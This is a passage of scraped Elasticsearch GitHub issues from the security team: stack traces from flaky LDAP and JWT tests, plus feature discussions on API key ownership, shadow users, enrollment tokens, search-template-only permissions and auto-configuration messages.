  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at java.lang.Thread.run(Thread.java:748)

  Caused by: java.util.concurrent.ExecutionException: LDAPException(resultCode=81 (server down), errorMessage='The connection to server 127.0.0.1:57870 was closed while waiting for a response to a bind request SimpleBindRequest(dn='cn=Horatio Hornblower,ou=people,o=sevenSeas').', ldapSDKVersion=4.0.8, revision=28812)

    at org.elasticsearch.common.util.concurrent.BaseFuture$Sync.getValue(BaseFuture.java:262)
    at org.elasticsearch.common.util.concurrent.BaseFuture$Sync.get(BaseFuture.java:249)
    at org.elasticsearch.common.util.concurrent.BaseFuture.get(BaseFuture.java:76)
    at org.elasticsearch.common.util.concurrent.FutureUtils.get(FutureUtils.java:45)
    at org.elasticsearch.action.support.AdapterActionFuture.actionGet(AdapterActionFuture.java:26)
    at org.elasticsearch.xpack.security.authc.ldap.support.LdapTestCase.session(LdapTestCase.java:209)
    at org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests.testGroupLookupBase(LdapSessionFactoryTests.java:232)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:498)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
    at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
    at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
    at java.lang.Thread.run(Thread.java:748)

    Caused by: com.unboundid.ldap.sdk.LDAPException: The connection to server 127.0.0.1:57870 was closed while waiting for a response to a bind request SimpleBindRequest(dn='cn=Horatio Hornblower,ou=people,o=sevenSeas').

      at com.unboundid.ldap.sdk.SimpleBindRequest.handleResponse(SimpleBindRequest.java:712)
      at com.unboundid.ldap.sdk.SimpleBindRequest.process(SimpleBindRequest.java:579)
      at com.unboundid.ldap.sdk.LDAPConnection.processBindOperation(LDAPConnection.java:4354)
      at com.unboundid.ldap.sdk.LDAPConnection.bind(LDAPConnection.java:2265)
      at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils$2.lambda$doRun$0(LdapUtils.java:183)
      at java.security.AccessController.doPrivileged(AccessController.java:-2)
      at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils.privilegedConnect(LdapUtils.java:75)
      at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils$2.doRun(LdapUtils.java:183)
      at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:26)
      at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils.maybeForkAndRun(LdapUtils.java:101)
      at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils.maybeForkThenBind(LdapUtils.java:199)
      at org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactory$1.loop(LdapSessionFactory.java:102)
      at org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactory.session(LdapSessionFactory.java:104)
      at org.elasticsearch.xpack.security.authc.ldap.support.LdapTestCase.session(LdapTestCase.java:208)
      at org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests.testGroupLookupBase(LdapSessionFactoryTests.java:232)
      at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
      at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
      at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
      at java.lang.reflect.Method.invoke(Method.java:498)
      at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
      at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
      at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
      at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
      at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
      at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
      at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
      at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
      at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
      at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
      at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
      at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
      at java.lang.Thread.run(Thread.java:748)

```","Pinging @elastic/es-security (Team:Security)I found https://github.com/elastic/elasticsearch/issues/67638 which looks a bit related due to the similarity in the stack traces. Another error from the logs that I saw while trying to find a possible root cause:
```
 1> [2021-07-09T00:00:30,171][WARN ][o.e.c.s.DiagnosticTrustManager] [testSslTrustIsReloaded] failed to establish trust with server at [127.0.0.1]; the server provided a certificate with subject name [CN=ldap-test-case] and fingerprint [f0ec1d66351f3f56b9dc6f8d899ae698303c7e00]; the certificate has subject alternative names [DNS:localhost,IP:127.0.0.1]; the certificate is issued by [CN=Elastic Certificate Tool Autogenerated CA] but the server did not provide a copy of the issuing certificate in the certificate chain; this ssl context ([xpack.security.authc.realms.ldap.ldap1.ssl]) is not configured to trust that issuer, it only trusts the issuer [CN=ad-ELASTICSEARCHAD-CA,DC=ad,DC=test,DC=elasticsearch,DC=com] with fingerprint [41856ccd8b39da830384205200e6f2062eaaac7c]
  1> sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
  1> 	at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:439) ~[?:?]
  1> 	at sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:306) ~[?:?]
  1> 	at sun.security.validator.Validator.validate(Validator.java:271) ~[?:?]
  1> 	at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:312) ~[?:?]
  1> 	at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:221) ~[?:?]
  1> 	at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:128) ~[?:?]
  1> 	at org.elasticsearch.common.ssl.DiagnosticTrustManager.checkServerTrusted(DiagnosticTrustManager.java:79) ~[elasticsearch-ssl-config-7.13.4-SNAPSHOT.jar:7.13.4-SNAPSHOT]
  1> 	at sun.security.ssl.CertificateMessage$T13CertificateConsumer.checkServerCerts(CertificateMessage.java:1338) ~[?:?]
  1> 	at sun.security.ssl.CertificateMessage$T13CertificateConsumer.onConsumeCertificate(CertificateMessage.java:1229) ~[?:?]
  1> 	at sun.security.ssl.CertificateMessage$T13CertificateConsumer.consume(CertificateMessage.java:1172) ~[?:?]
  1> 	at sun.security.ssl.SSLHandshake.consume(SSLHandshake.java:376) ~[?:?]
  1> 	at sun.security.ssl.HandshakeContext.dispatch(HandshakeContext.java:444) ~[?:?]
  1> 	at sun.security.ssl.HandshakeContext.dispatch(HandshakeContext.java:422) ~[?:?]
  1> 	at sun.security.ssl.TransportContext.dispatch(TransportContext.java:183) ~[?:?]
  1> 	at sun.security.ssl.SSLTransport.decode(SSLTransport.java:154) ~[?:?]
  1> 	at sun.security.ssl.SSLSocketImpl.decode(SSLSocketImpl.java:1279) ~[?:?]
  1> 	at sun.security.ssl.SSLSocketImpl.readHandshakeRecord(SSLSocketImpl.java:1188) ~[?:?]
  1> 	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:401) ~[?:?]
  1> 	at sun.security.ssl.SSLSocketImpl.ensureNegotiated(SSLSocketImpl.java:808) ~[?:?]
  1> 	at sun.security.ssl.SSLSocketImpl.getSession(SSLSocketImpl.java:333) ~[?:?]
  1> 	at com.unboundid.util.ssl.HostNameSSLSocketVerifier.verifySSLSocket(HostNameSSLSocketVerifier.java:106) ~[unboundid-ldapsdk-4.0.8.jar:4.0.8]
  1> 	at com.unboundid.ldap.sdk.LDAPConnectionInternals.<init>(LDAPConnectionInternals.java:166) ~[unboundid-ldapsdk-4.0.8.jar:4.0.8]
  1> 	at com.unboundid.ldap.sdk.LDAPConnection.connect(LDAPConnection.java:860) ~[unboundid-ldapsdk-4.0.8.jar:4.0.8]
  1> 	at com.unboundid.ldap.sdk.LDAPConnection.connect(LDAPConnection.java:760) ~[unboundid-ldapsdk-4.0.8.jar:4.0.8]
  1> 	at com.unboundid.ldap.sdk.LDAPConnection.connect(LDAPConnection.java:710) ~[unboundid-ldapsdk-4.0.8.jar:4.0.8]
  1> 	at com.unboundid.ldap.sdk.LDAPConnection.<init>(LDAPConnection.java:534) ~[unboundid-ldapsdk-4.0.8.jar:4.0.8]
  1> 	at com.unboundid.ldap.sdk.SingleServerSet.getConnection(SingleServerSet.java:307) ~[unboundid-ldapsdk-4.0.8.jar:4.0.8]
  1> 	at com.unboundid.ldap.sdk.FailoverServerSet.getConnection(FailoverServerSet.java:653) ~[unboundid-ldapsdk-4.0.8.jar:4.0.8]
  1> 	at com.unboundid.ldap.sdk.FailoverServerSet.getConnection(FailoverServerSet.java:567) ~[unboundid-ldapsdk-4.0.8.jar:4.0.8]
  1> 	at java.security.AccessController.doPrivileged(Native Method) ~[?:1.8.0_281]
  1> 	at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils.privilegedConnect(LdapUtils.java:75) ~[main/:?]
  1> 	at org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactory$1.<init>(LdapSessionFactory.java:66) ~[main/:?]
  1> 	at org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactory.session(LdapSessionFactory.java:65) ~[main/:?]
  1> 	at org.elasticsearch.xpack.security.authc.ldap.support.LdapTestCase.session(LdapTestCase.java:208) ~[test/:?]
  1> 	at org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests.lambda$testSslTrustIsReloaded$2(LdapSessionFactoryTests.java:287) ~[test/:?]
```
That might be a follow up problem though, I'm not sure.As far as I can tell this failed because the in memory LDAP server was no longer listening on the expected port.
I can't find any useful way to debug why that would be the case, nor does it appear that the UnboundId provides a way to hook into listener shutdown events to log when the server closes its socket.

I've opted to add some extract logging to the base test case to list each time the in memory directory is started & stopped. If this issue recurs, then that might shed some light on what's happening.  ",no,">test-failure,:Security/Authentication,Team:Security,"
elastic/elasticsearch,819854129,"Differentiate between owner and creator for API keys","Today, API keys have a `creator` field which records user information about the person who owns the key. This single field of `creator` is inaccurate and insufficient because an API key can be [granted](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-grant-api-key.html) to an user by a different user. For example, when UserA grants an API key to UserB, the `creator` field holds information about UserB. The problems are:
1. UserB is not really the `creator` of the key, but rather the `owner`.
2. The information about UserA is not recorded (basically lost unless audit logging is enabled)
3. There is no way for UserA to directly manage the API after its creation

We should improve the situation by explicitly differetiate between API key `owner` and `creator` and record both of them at creation time. 

PS: 
* `creator` can also be called `manager` which is more inline with the privilege names, e.g. `manage_api_key`.
* The `creator` field can potentially be an array. In this case, it is better named as `managers`.","Pinging @elastic/es-security (Team:Security)@ywangd I agree we could store more information.

I think that changing the ""scope"" of `creator` field is a breaking change that may significantly impact security checks based on that field, even if the name would be more consistent.
An alternative is to introduce a field named `granted_by`, or something along those lines.

I'm also wondering which is the scenario where an API key has multiple `managers`.I should have been clear that I am more focused on separation of the concepts instead of the actual field names. I agree that practically we are likely to keep the existing `creator` field as is and just add a new field for the ""true creator"".

> I'm also wondering which is the scenario where an API key has multiple managers.
>
This is just a brainstorm. I was thinking maybe some hierarchical management (organisation levels) or certain shared responsibilities.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317450580,"Enumerating users in non-native realms","*Original comment by @kobelb:*

When implementing OLS/RBAC in Kibana, we'd like a way to be able to enumerate all users to enable users to share a securable object (Dashboard, Visualization, etc.) with a specific user.

From my understanding, this is currently possible using Elasticsearch only for native realms, where-as SAML/LDAP don't currently support this functionality. It's possible for Kibana to store this information itself when user's login. If Elasticsearch were to expose this functionality for SAML/LDAP, we could take advantage of it, but I'm not sure if it alone is justification for Elasticsearch to implement this functionality. 

Are there any other use-cases this feature would enable that justify us implementing it in Elasticsearch?","*Original comment by @epixa:*

I'll let the Elasticsearch team weigh in on whether this is valuable to them, but I think Kibana is going to need its own user objects anyway, so I don't see much value in leaning on Elasticsearch for this. Things like profile pictures, for example, are entirely appropriate for a web app like Kibana, but not at all relevant for users in Elasticsearch. Not to mention things like kibana-specific user preferences.*Original comment by @jaymode:*

@tvernum refers to this as ""shadow"" users. This is definitely something that could be done and I think it has value for certain things like ML/Watcher. Currently both just store headers that came in with a request in order to run as the creating user. This means that the permissions a watch/job executes with are not necessarily accurate.

One issue that we can run into is the non-uniqueness of a username; the same username could exist within multiple realms. Its probably a edge case, but it is worth mentioning.*Original comment by @tvernum:*

We discussed this is our team meeting today, and the conclusion was something along the lines of:

- we think shadow users are interesting & they open up a number of feature possibilities
- but they're hard to explain and have their own set of trade-offs
- we'll probably do something in that space, but we'd want to think through how we'd fit it into the product and what use cases we'd support before we tackled it.

I suspect we're not going to have anything to offer you in the short-medium term, especially given @epixa's comments above about Kibana needing its own user objects. *Original comment by @kobelb:*

@tvernum sounds good to me. There's potential for us to use the Kibana users in the short-term and then move to using Elasticsearch's shadow users if they get implemented and we see benefit from it.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1304242248,"Security Autoconfiguration - Filter Kibana Enrollment Address according to HTTP SAN","### Description

When [creating a Kibana enrollment token](https://www.elastic.co/guide/en/elasticsearch/reference/master/create-enrollment-token.html) we look at [the node's bound addresses](https://github.com/elastic/elasticsearch/blob/537f371f348207e7c59d28162b61c3720e931d0c/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/enrollment/ExternalEnrollmentTokenGenerator.java#L156) (via [`/_nodes/_local/http`](https://github.com/elastic/elasticsearch/blob/a2bc4854b562782a8a66eeacb23246d4d21a2b01/server/src/main/java/org/elasticsearch/rest/action/admin/cluster/RestNodesInfoAction.java#L42)).

However, it is possible that only some of those bound addresses match the DNS/IP Subject Alternative Names in the HTTP certificate. Thus, some of those addresses are more likely to work for enrollment than others (because they will support HTTPS hostname verification).

However, we don't current make it easy for Kibana to pick the right name from the token. The [token contains the CA fingerprint, and the list of all possible addresses](https://github.com/elastic/elasticsearch/blob/3c66958f08f9c2da9dbb601a6ff250d7153f8c78/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core/security/EnrollmentToken.java#L82-L95), but no way for Kibana to know which addresses will match the node certificate's SAN.

We could either:
- Filter the addresses, so that if _some, but not all_ of the bound/publish address match the subject alternative names of the cert, we only provide the matching addresses.
- _or_ Add a new field into the token that has ""preferred addresses"" or ""san addresses"", so that Kibana can pick the right one.
","Pinging @elastic/es-security (Team:Security)This might be resolved in Kibana instead
- https://github.com/elastic/kibana/issues/136379",no,">enhancement,Team:Security,:Security/AutoConfiguration,"
elastic/elasticsearch,1287804896,"Higher granularity read permission: read_search_template","### Description

Hello!

## The Problem
I've currently got a website with a static web frontend that makes http calls to an elastic search instance. The browser uses a read only api key to retrieve the data. I have three fixed queries that the frontend makes to the backend. However there is nothing in ES to prevent the execution of other arbitrary queries. 

There is no way to limit the possible queries that can be executed on ES with this particular api key.

I've looked into using [Search Templates](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-template.html) which fits the bill of having a fixed query, however it doesn't appear that a particular user/apikey can be limited to using that search template only.

## Proposed Solution
Create a new [index permission](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-privileges.html#privileges-list-indices), `read_search_template` which enables the reading of indexed documents _but only through a search template_. The web server has traditionally been the gatekeeper to data in the db. However with tools like [Postgrest](https://postgrest.org/), there is an increasing amount of sophistication in databases, making cookie cutter web servers less necessary. Providing finer grain access to data makes a hosted ES offering more compelling because it gives more reason to eliminate a web server.

## Alternative Solutions
* Instead of querying ES directly from the browser, I could make a request to a web server, which then queries ES. This would put the credentials into the web server, effectively limiting the public availability of the data. The pain here, is this would be my first need for a web server on my project. I've been using other JAMstack technology plus ES, making it a really low amount of operational maintenance.

Thanks!","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,1346619045,"[CI] JwtRealmAuthenticateTests testJwkSetUpdates failing","The test seems a bit flaky, since it has failed some times during the last 28 days. I cannot reproduce it locally.

**Build scan:**
https://gradle-enterprise.elastic.co/s/apnw3fyka43b2/tests/:x-pack:plugin:security:test/org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests/testJwkSetUpdates

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwkSetUpdates"" -Dtests.seed=6B2F4ED558B90FA -Dtests.locale=bg -Dtests.timezone=Cuba -Druntime.java=17`

**Applicable branches:**
main

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests&tests.test=testJwkSetUpdates

**Failure excerpt:**
```
java.lang.AssertionError: 
Expected: is <false>
     but: was <true>

  at __randomizedtesting.SeedInfo.seed([6B2F4ED558B90FA:346D5564AC84C16E]:0)
  at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
  at org.junit.Assert.assertThat(Assert.java:956)
  at org.junit.Assert.assertThat(Assert.java:923)
  at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.verifyAuthenticateFailureHelper(JwtRealmTestCase.java:121)
  at org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwkSetUpdates(JwtRealmAuthenticateTests.java:227)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:568)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
  at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)another one on a branch created of main. does not reproduce too
https://gradle-enterprise.elastic.co/s/h4kbcnt2jvrnw/tests/:x-pack:plugin:security:test/org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests/testJwkSetUpdates?top-execution=1",no,">test-failure,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317447838,"[Security] [LDAP] Support bind_dn for group_search in user_dn_template mode","*Original comment by @tvernum:*

See: LINK REDACTED

When using `user_dn_template` mode, the group search is always executed as the authenticating user. When using `user_search` mode (with connection pooling) the group search runs as `bind_dn`.

This difference is surprising, and means that template mode can't be used in some cases where it might otherwise be appropriate. That is, template mode can be quite efficient when all users are in a single sub-tree, but it requires that the user has permission to search for their groups.

",,no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1155081386,"Clear message on skipping auto-configuration for packaged installations","When we install an RPM/DEB package and we determine that we should not run auto-configuration for security features, we simply print: 
```
--------------------------- Security autoconfiguration information ------------------------------

Skipping auto-configuration because security features appear to be already configured.

-------------------------------------------------------------------------------------------------
```

This can be misleading and also hides the actual cause of us skipping auto-configuration. 

We can add a more generic default message and pass `-v` to https://github.com/elastic/elasticsearch/blob/master/distribution/packages/src/common/scripts/postinst#L65 so that the actual reason of not doing auto-configuration is printed above this message directly from `AutoConfigureNode` class. ","Pinging @elastic/es-security (Team:Security)",no,">enhancement,Team:Security,:Security/AutoConfiguration,"
elastic/elasticsearch,838205885,"Provide introductory docs for API Keys ","It is common for people to stumble across the API key documentation and assume that API Keys is the preferred/recommended way to authenticate to Elasticsearch

I often come across comments on discuss or community-slack where a conversation starts with ""I'm trying to use API Keys and ..."" and after digging it turns out that API keys aren't a good fit for their needs, but they assumed API Keys are how they're supposed to interact with ES.

